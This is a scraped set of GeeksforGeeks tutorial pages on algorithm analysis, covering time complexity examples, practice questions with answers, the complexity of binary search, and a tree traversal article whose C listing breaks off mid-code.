Understanding Time Complexity with Simple Examples - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Understanding Time Complexity with Simple ExamplesPractice Questions on Time Complexity AnalysisAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis) Understanding Time Complexity with Simple Examples Last Updated: 12-11-2020 A lot of students get confused while understanding the concept of time-complexity, but in this article, we will explain it with a very simple example:Imagine a classroom of 100 students in which you gave your pen to one person. Now, you want that pen. Here are some ways to find the pen and what the O order is.O(n2): You go and ask the first person of the class, if he has the pen. Also, you ask this person about other 99 people in the classroom if they have that pen and so on, This is what we call O(n2). O(n): Going and asking each student individually is O(N). O(log n): Now I divide the class into two groups, then ask: “Is it on the left side, or the right side of the classroom?” Then I take that group and divide it into two and ask again, and so on. Repeat the process till you are left with one student who has your pen. This is what you mean by O(log n). I might need to do the O(n2) search if only one student knows on which student the pen is hidden. I’d use the O(n) if one student had the pen and only they knew it. I’d use the O(log n) search if all the students knew, but would only tell me if I guessed the right side. NOTE : We are interested in rate of growth of time with respect to the inputs taken during the program execution . Another Example:Time Complexity of algorithm/code is not equal to the actual time required to execute a particular code but the number of times a statement executes. We can prove this by using time command. For example, Write code in C/C++ or any other language to find maximum between N numbers, where N varies from 10, 100, 1000, 10000. And compile that code on Linux based operating system (Fedora or Ubuntu) with below command: gcc program.c – o program run it with time ./program You will get surprising results i.e. for N = 10 you may get 0.5ms time and for N = 10, 000 you may get 0.2 ms time. Also, you will get different timings on the different machine. So, we can say that actual time requires to execute code is machine dependent (whether you are using pentium1 or pentiun5) and also it considers network load if your machine is in LAN/WAN. Even you will not get the same timings on the same machine for the same code, the reason behind that the current network load. Now, the question arises if time complexity is not the actual time require executing the code then what is it? The answer is : Instead of measuring actual time required in executing each statement in the code, we consider how many times each statement execute. For example: C filter_none edit close play_arrow link brightness_4 code #include <stdio.h> int main() { printf("Hello World"); } chevron_right filter_none Output Hello World In above code “Hello World!!!” print only once on a screen. So, time complexity is constant: O(1) i.e. every time constant amount of time require to execute code, no matter which operating system or which machine configurations you are using. Now consider another code: C filter_none edit close play_arrow link brightness_4 code #include <stdio.h> void main() { int i, n = 8; for (i = 1; i <= n; i++) { printf("Hello Word !!!\n"); } } chevron_right filter_none Output Hello Word !!! Hello Word !!! Hello Word !!! Hello Word !!! Hello Word !!! Hello Word !!! Hello Word !!! Hello Word !!! In above code “Hello World!!!” will print N times. So, time complexity of above code is O(N).Source : Reddit ADDITIONAL INFORMATION :For example: Let us consider a model machine which has the following specifications: –Single processor –32 bit –Sequential execution –1 unit time for arithmetic and logical operations –1 unit time for assignment and return statements 1.Sum of 2 numbers : C filter_none edit close play_arrow link brightness_4 code Pseudocode: Sum(a,b){ return a+b //Takes 2 unit of time(constant) one for arithmetic operation and one for return.(as per above conventions) cost=2 no of times=1 } chevron_right filter_none Tsum= 2 = C =O(1) 2.Sum of all elements of a list : C filter_none edit close play_arrow link brightness_4 code Pseudocode: list_Sum(A,n){//A->array and n->number of elements in the array total =0 // cost=1 no of times=1 for i=0 to n-1 // cost=2 no of times=n+1 (+1 for the end false condition) sum = sum + A[i] // cost=2 no of times=n return sum // cost=1 no of times=1 } chevron_right filter_none Tsum=1 + 2 * (n+1) + 2 * n + 1 = 4n + 4 =C1 * n + C2 = O(n) 3.Sum of all elements of a matrix : For this one the complexity is a polynomial equation (quadratic equation for a square matrix) Matrix nxn => Tsum= an2 +bn + cFor this Tsum if in order of n2 = O(n2)The above codes do not run in the IDE as they are pseudo codes and do not resemble any programming language . So from the above, we can conclude that the time of execution increases with the type of operations we make using the inputs.The above O -> is called Big – Oh which is an asymptotic notation. There are other asymptotic notations like theta and Ohm.You can refer : Read about asymptotic notations The additional information provided author of this article is Pathange Balaji Rao. Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Time Complexity of building a heapAn interesting time complexity questionTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallyTime complexity of recursive Fibonacci programPractice Questions on Time Complexity AnalysisTime Complexity Analysis | Tower Of Hanoi (Recursion)Python Code for time Complexity plot of Heap SortC program for Time Complexity plot of Bubble, Insertion and Selection Sort using GnuplotTime Complexity of Loop with PowersA Time Complexity QuestionWhat does 'Space Complexity' mean?Complexity of different operations in Binary tree, Binary Search Tree and AVL treeKnowing the complexity in competitive programmingCyclomatic ComplexityComplexity Analysis of Binary SearchComplexity analysis of various operations of Binary Min HeapTime taken by Loop unrolling vs Normal loopMeasure execution time with high precision in C/C++Microsoft Interview experience for full time position of software engineer at Microsoft Ireland ResearchDhawal AroraCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : BalajiPathange, deekshadaga, shankaramshubham8 Article Tags : Analysis thumb_up 62 To-do Done 2.2 Based on 24 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Iterated Logarithm log*(n) Next last_page Practice Questions on Time Complexity Analysis Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeDifference between NP hard and NP complete problemComplexity Analysis of Binary SearchCyclomatic Complexity More related articles in Analysis Analysis of different sorting techniquesProof that SAT is NP CompleteTime complexity of recursive Fibonacci programProof that traveling salesman problem is NP HardAnalysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Practice Questions on Time Complexity Analysis - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Practice Questions on Time Complexity AnalysisAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 4 (Solving Recurrences)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)What does ‘Space Complexity’ mean?Pseudo-polynomial AlgorithmsNP-Completeness | Set 1 (Introduction)A Time Complexity QuestionMerge SortQuickSortHeapSortBinary HeapTime Complexity of building a heapApplications of Heap Data StructureBinomial HeapFibonacci Heap | Set 1 (Introduction)Fibonacci Heap – Insertion and UnionFibonacci Heap – Deletion, Extract min and Decrease keyLeftist Tree / Leftist HeapK-ary HeapIterative HeapSortAnalysis of Algorithms | Set 1 (Asymptotic Analysis) Practice Questions on Time Complexity Analysis Last Updated: 12-12-2017 Prerequiste: Analysis of Algorithms 1. What is the time, space complexity of following code: filter_none edit close play_arrow link brightness_4 code int a = 0, b = 0; for (i = 0; i < N; i++) { a = a + rand(); } for (j = 0; j < M; j++) { b = b + rand(); } chevron_right filter_none Options: O(N * M) time, O(1) space O(N + M) time, O(N + M) space O(N + M) time, O(1) space O(N * M) time, O(N + M) space Output: 3. O(N + M) time, O(1) space Explanation: The first loop is O(N) and the second loop is O(M). Since we don’t know which is bigger, we say this is O(N + M). This can also be written as O(max(N, M)). Since there is no additional space being utilized, the space complexity is constant / O(1) 2. What is the time complexity of following code: filter_none edit close play_arrow link brightness_4 code int a = 0; for (i = 0; i < N; i++) { for (j = N; j > i; j--) { a = a + i + j; } } chevron_right filter_none Options: O(N) O(N*log(N)) O(N * Sqrt(N)) O(N*N) Output: 4. O(N*N) Explanation: The above code runs total no of times = N + (N – 1) + (N – 2) + … 1 + 0 = N * (N + 1) / 2 = 1/2 * N^2 + 1/2 * N O(N^2) times. 3. What is the time complexity of following code: filter_none edit close play_arrow link brightness_4 code int i, j, k = 0; for (i = n / 2; i <= n; i++) { for (j = 2; j <= n; j = j * 2) { k = k + n / 2; } } chevron_right filter_none Options: O(n) O(nLogn) O(n^2) O(n^2Logn) Output: 2. O(nLogn) Explanation:If you notice, j keeps doubling till it is less than or equal to n. Number of times, we can double a number till it is less than n would be log(n). Let’s take the examples here. for n = 16, j = 2, 4, 8, 16 for n = 32, j = 2, 4, 8, 16, 32 So, j would run for O(log n) steps. i runs for n/2 steps. So, total steps = O(n/ 2 * log (n)) = O(n*logn) 4. What does it mean when we say that an algorithm X is asymptotically more efficient than Y? Options: X will always be a better choice for small inputs X will always be a better choice for large inputs Y will always be a better choice for small inputs X will always be a better choice for all inputs 2. X will always be a better choice for large inputs Explanation: In asymptotic analysis we consider growth of algorithm in terms of input size. An algorithm X is said to be asymptotically better than Y if X takes smaller time than y for all input sizes n larger than a value n0 where n0 > 0. 5. What is the time complexity of following code: filter_none edit close play_arrow link brightness_4 code int a = 0, i = N; while (i > 0) { a += i; i /= 2; } chevron_right filter_none Options: O(N) O(Sqrt(N)) O(N / 2) O(log N) Output: 4. O(log N) Explanation: We have to find the smallest x such that N / 2^x N x = log(N) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Time Complexity Analysis | Tower Of Hanoi (Recursion)Complexity Analysis of Binary SearchComplexity analysis of various operations of Binary Min HeapAlgorithms Sample Questions | Set 3 | Time Order AnalysisAnalysis of Algorithms | Set 5 (Practice Problems)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Time Complexity of building a heapAn interesting time complexity questionTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallyTime complexity of recursive Fibonacci programPython Code for time Complexity plot of Heap SortC program for Time Complexity plot of Bubble, Insertion and Selection Sort using GnuplotTime Complexity of Loop with PowersA Time Complexity QuestionUnderstanding Time Complexity with Simple ExamplesWhat does 'Space Complexity' mean?Abhishek Sharma 44Check out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below. Article Tags : Analysis thumb_up 70 To-do Done 1.5 Based on 51 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Understanding Time Complexity with Simple Examples Next last_page Practice Set for Recurrence Relations Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeDifference between NP hard and NP complete problemComplexity Analysis of Binary SearchUnderstanding Time Complexity with Simple Examples More related articles in Analysis Time complexity of recursive Fibonacci programAnalysis of different sorting techniquesCyclomatic ComplexityProof that traveling salesman problem is NP HardAnalysis of Algorithms | Big-O analysis room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Complexity Analysis of Binary Search - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Complexity Analysis of Binary SearchBinary SearchProgram to check if a given number is Lucky (all digits are different)Lucky NumbersWrite a program to add two numbers in base 14Babylonian method for square rootSquare root of an integerFind square root of number upto given precision using binary searchLinear SearchLinear Search vs Binary SearchInterpolation search vs Binary searchInterpolation SearchExponential SearchWhy is Binary Search preferred over Ternary Search?Ternary SearchStooge SortPython Program for Stooge SortPython Program for Insertion SortPython Program for Selection SortPython Program for Bubble SortBubble SortRecursionA* Search AlgorithmDifference between BFS and DFSHow to write a Pseudo Code?Data Structures and Algorithms Online Courses : Free and PaidRecursive Practice Problems with SolutionsPlayfair Cipher with ExamplesConverting Roman Numerals to Decimal lying between 1 to 3999Commonly Asked Algorithm Interview Questions | Set 1 Complexity Analysis of Binary Search Last Updated: 30-09-2019 Complexities like O(1) and O(n) are simple to understand. O(1) means it requires constant time to perform operations like to reach an element in constant time as in case of dictionary and O(n) means, it depends on the value of n to perform operations such as searching an element in an array of n elements. But for O(Log n), it is not that simple. Let us discuss this with the help of Binary Search Algorithm whose complexity is O(log n). Binary Search: Search a sorted array by repeatedly dividing the search interval in half. Begin with an interval covering the whole array. If the value of the search key is less than the item in the middle of the interval, narrow the interval to the lower half. Otherwise, narrow it to the upper half. Repeatedly check until the value is found or the interval is empty. Example: Sorted Array of 10 elements: 2, 5, 8, 12, 16, 23, 38, 56, 72, 91 Let us say we want to search for 23. Finding the given element: Now to find 23, there will be many iterations with each having steps as mentioned in the figure above: Iteration 1: Array: 2, 5, 8, 12, 16, 23, 38, 56, 72, 91 Select the middle element. (here 16) Since 23 is greater than 16, so we divide the array into two halves and consider the sub-array after element 16. Now this subarray with the elements after 16 will be taken into next iteration. Iteration 2: Array: 23, 38, 56, 72, 91 Select the middle element. (now 56) Since 23 is smaller than 56, so we divide the array into two halves and consider the sub-array before element 56. Now this subarray with the elements before 56 will be taken into next iteration. Iteration 3: Array: 23, 38 Select the middle element. (now 23) Since 23 is the middle element. So the iterations will now stop. Calculating Time complexity: Let say the iteration in Binary Search terminates after k iterations. In the above example, it terminates after 3 iterations, so here k = 3 At each iteration, the array is divided by half. So let’s say the length of array at any iteration is n At Iteration 1, Length of array = n At Iteration 2, Length of array = n⁄2 At Iteration 3, Length of array = (n⁄2)⁄2 = n⁄22 Therefore, after Iteration k, Length of array = n⁄2k Also, we know that after After k divisions, the length of array becomes 1 Therefore Length of array = n⁄2k = 1 => n = 2k Applying log function on both sides: => log2 (n) = log2 (2k) => log2 (n) = k log2 (2) As (loga (a) = 1) Therefore, => k = log2 (n) Hence, the time complexity of Binary Search is log2 (n) Attention reader! Don’t stop learning now. Get hold of all the important DSA concepts with the DSA Self Paced Course at a student-friendly price and become industry ready. My Personal Notes arrow_drop_up Save Recommended Posts:Complexity analysis of various operations of Binary Min HeapComplexity of different operations in Binary tree, Binary Search Tree and AVL treePractice Questions on Time Complexity AnalysisTime Complexity Analysis | Tower Of Hanoi (Recursion)Analysis of Algorithms | Set 4 (Analysis of Loops)Analysis of Algorithm | Set 5 (Amortized Analysis Introduction)Analysis of Algorithms | Big-O analysisAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Meta Binary Search | One-Sided Binary SearchInterpolation search vs Binary searchWhy is Binary Search preferred over Ternary Search?Linear Search vs Binary SearchJava Program to Search ArrayList Element Using Binary SearchWhat does 'Space Complexity' mean?Time Complexity of building a heapAn interesting time complexity questionTime Complexity where loop variable is incremented by 1, 2, 3, 4 ..Time Complexity of a Loop when Loop variable “Expands or Shrinks” exponentiallySieve of Eratosthenes in 0(n) time complexityTime complexity of recursive Fibonacci programravikishorCheck out this Author's contributed articles.If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please Improve this article if you find anything incorrect by clicking on the "Improve Article" button below.Improved By : ddg2112 Article Tags : AlgorithmsAnalysisDivide and ConquerMathematicalSearching Practice Tags : SearchingMathematicalDivide and ConquerAlgorithms thumb_up 23 To-do Done 1 Based on 4 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Find maximum path sum in a 2D matrix when exactly two left moves are allowed Next last_page Sorting Algorithms Visualization : Bubble Sort Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Algorithms Difference between NP hard and NP complete problemCyclomatic ComplexityQuadratic Probing in HashingQuick Sort vs Merge SortDifference Between Symmetric and Asymmetric Key Encryption Most visited in Analysis Proof that Clique Decision problem is NP-Complete | Set 2Complexity of different operations in Binary tree, Binary Search Tree and AVL treeAnalysis of Algorithms | Set 1 (Asymptotic Analysis)Difference between NP hard and NP complete problemAnalysis of Algorithms | Set 3 (Asymptotic Notations) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Tree Traversals (Inorder, Preorder and Postorder) - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Print all possible paths from top left to bottom right of a mXn matrixUnique paths in a Grid with ObstaclesUnique paths covering every non-obstacle block exactly once in a gridDepth First Search or DFS for a GraphBreadth First Search or BFS for a GraphLevel Order Binary Tree TraversalTree Traversals (Inorder, Preorder and Postorder)Inorder Tree Traversal without RecursionInorder Tree Traversal without recursion and without stack!Print Postorder traversal from given Inorder and Preorder traversalsConstruct Tree from given Inorder and Preorder traversalsConstruct a Binary Tree from Postorder and InorderConstruct Full Binary Tree from given preorder and postorder traversalsN Queen Problem | Backtracking-3Printing all solutions in N-Queen ProblemWarnsdorff’s algorithm for Knight’s tour problemThe Knight’s tour problem | Backtracking-1Rat in a Maze | Backtracking-2Count number of ways to reach destination in a MazeCount all possible paths from top left to bottom right of a mXn matrixMust Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...What is Memory Leak? How can we avoid?Must Do Coding Questions Company-wisePractice for cracking any coding interviewCommonly Asked Data Structure Interview Questions | Set 1Analysis of Algorithms | Set 1 (Asymptotic Analysis)SQL | Join (Inner, Left, Right and Full Joins)Analysis of Algorithms | Set 2 (Worst, Average and Best Cases)Analysis of Algorithms | Set 3 (Asymptotic Notations) Tree Traversals (Inorder, Preorder and Postorder) Last Updated: 01-11-2018 Unlike linear data structures (Array, Linked List, Queues, Stacks, etc) which have only one logical way to traverse them, trees can be traversed in different ways. Following are the generally used ways for traversing trees. Example Tree Depth First Traversals: (a) Inorder (Left, Root, Right) : 4 2 5 1 3 (b) Preorder (Root, Left, Right) : 1 2 4 5 3 (c) Postorder (Left, Right, Root) : 4 5 2 3 1 Breadth First or Level Order Traversal : 1 2 3 4 5 Please see this post for Breadth First Traversal. Inorder Traversal (Practice): Algorithm Inorder(tree) 1. Traverse the left subtree, i.e., call Inorder(left-subtree) 2. Visit the root. 3. Traverse the right subtree, i.e., call Inorder(right-subtree) Uses of Inorder In case of binary search trees (BST), Inorder traversal gives nodes in non-decreasing order. To get nodes of BST in non-increasing order, a variation of Inorder traversal where Inorder traversal s reversed can be used. Example: Inorder traversal for the above-given figure is 4 2 5 1 3. Preorder Traversal (Practice): Algorithm Preorder(tree) 1. Visit the root. 2. Traverse the left subtree, i.e., call Preorder(left-subtree) 3. Traverse the right subtree, i.e., call Preorder(right-subtree) Uses of Preorder Preorder traversal is used to create a copy of the tree. Preorder traversal is also used to get prefix expression on of an expression tree. Please see http://en.wikipedia.org/wiki/Polish_notation to know why prefix expressions are useful. Example: Preorder traversal for the above given figure is 1 2 4 5 3. Postorder Traversal (Practice): Algorithm Postorder(tree) 1. Traverse the left subtree, i.e., call Postorder(left-subtree) 2. Traverse the right subtree, i.e., call Postorder(right-subtree) 3. Visit the root. Uses of Postorder Postorder traversal is used to delete the tree. Please see the question for deletion of tree for details. Postorder traversal is also useful to get the postfix expression of an expression tree. Please see http://en.wikipedia.org/wiki/Reverse_Polish_notation to for the usage of postfix expression. Example: Postorder traversal for the above given figure is 4 5 2 3 1. C++ filter_none edit close play_arrow link brightness_4 code // C program for different tree traversals #include <iostream> using namespace std; /* A binary tree node has data, pointer to left child and a pointer to right child */ struct Node { int data; struct Node* left, *right; Node(int data) { this->data = data; left = right = NULL; } }; /* Given a binary tree, print its nodes according to the "bottom-up" postorder traversal. */ void printPostorder(struct Node* node) { if (node == NULL) return; // first recur on left subtree printPostorder(node->left); // then recur on right subtree printPostorder(node->right); // now deal with the node cout << node->data << " "; } /* Given a binary tree, print its nodes in inorder*/ void printInorder(struct Node* node) { if (node == NULL) return; /* first recur on left child */ printInorder(node->left); /* then print the data of node */ cout << node->data << " "; /* now recur on right child */ printInorder(node->right); } /* Given a binary tree, print its nodes in preorder*/ void printPreorder(struct Node* node) { if (node == NULL) return; /* first print data of node */ cout << node->data << " "; /* then recur on left sutree */ printPreorder(node->left); /* now recur on right subtree */ printPreorder(node->right); } /* Driver program to test above functions*/ int main() { struct Node *root = new Node(1); root->left = new Node(2); root->right = new Node(3); root->left->left = new Node(4); root->left->right = new Node(5); cout << "\nPreorder traversal of binary tree is \n"; printPreorder(root); cout << "\nInorder traversal of binary tree is \n"; printInorder(root); cout << "\nPostorder traversal of binary tree is \n"; printPostorder(root); return 0; } chevron_right filter_none C filter_none edit close play_arrow link brightness_4 code // C program for different tree traversals #include <stdio.h> #include <stdlib.h> /* A binary tree node has data, pointer to left child and a pointer to right child */ struct node { int data; struct node* 